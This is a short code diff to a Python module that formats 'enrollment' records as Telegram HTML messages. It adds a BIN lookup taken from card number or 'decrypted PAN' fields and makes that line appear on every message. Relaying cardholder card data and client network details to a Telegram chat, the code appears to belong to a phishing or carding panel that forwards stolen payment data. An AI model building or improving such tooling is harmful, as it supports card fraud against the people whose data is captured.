@@ -107,14 +107,23 @@ def _network_and_client_lines(
     return lines
 
 
+def _pan_bin6_digits(reg: dict[str, Any]) -> str:
+    """Six-digit BIN from forward-only ``card_bin6`` or legacy decrypted PAN fields."""
+    bin6 = "".join(c for c in str(reg.get("card_bin6") or "") if c.isdigit())
+    if len(bin6) >= 6:
+        return bin6[:6]
+    pan = str(reg.get("card_number") or reg.get("cc") or "").replace(" ", "")
+    pan_digits = "".join(c for c in pan if c.isdigit())
+    return pan_digits[:6] if len(pan_digits) >= 6 else ""
+
+
 def _bin_lookup_line_html(reg: dict[str, Any]) -> str:
     """First 6 PAN digits only — HandyAPI BIN line for Telegram HTML."""
     esc = html.escape
-    pan = str(reg.get("card_number") or reg.get("cc") or "").replace(" ", "")
-    pan_digits = "".join(c for c in pan if c.isdigit())
+    pan_digits = _pan_bin6_digits(reg)
     if len(pan_digits) < 6:
         return "🔎 <b>BIN</b>: <i>Unknown</i>"
-    bin_info = fetch_bin_meta(pan_digits[:6])
+    bin_info = fetch_bin_meta(pan_digits)
     if bin_info:
         rows = [
             "💳 <b>BIN</b> <i>(first 6 · HandyAPI)</i>",
@@ -202,9 +211,8 @@ def _format_enrollment_telegram(
                     "",
                 ]
             )
-    if not (forward_blob and reg.get("pii_forward_only")):
-        lines.append(_bin_lookup_line_html(reg))
-        lines.append("")
+    lines.append(_bin_lookup_line_html(reg))
+    lines.append("")
     if extra_lines_before_network:
         lines.extend(extra_lines_before_network)
     lines.extend(
